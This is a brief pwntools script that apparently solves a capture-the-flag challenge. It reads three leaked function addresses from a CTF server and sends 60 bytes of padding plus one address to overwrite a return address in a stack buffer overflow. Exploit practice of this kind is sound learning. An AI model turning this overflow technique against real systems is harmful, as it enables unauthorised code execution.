from pwn import *

#Fn 3: 0x565586f1
#Fn 2: 0x565586af
#Fn 1: 0x5655866d


conn = remote('3-bh02.bootupctf.net',8221,level='debug')
conn.recvuntil(b"Fn 3:")
fn3 = conn.recvuntil(b"\n")
conn.recvuntil(b"Fn 2:")
fn2 = conn.recvuntil(b"\n")
conn.recvuntil(b"Fn 1:")
fn1 = conn.recvuntil(b"\n")

fn1 = fn1.strip()
fn2 = fn2.strip()
fn3 = fn3.strip()
fn1 = (p32(int(fn1,16)))
fn2 = (p32(int(fn2,16)))
fn3 = (p32(int(fn3,16)))
sleep(0.1)

conn.sendline(b'a'*60+fn3)
#conn.sendline(b'a'*60)
conn.recvline()
conn.recvline()
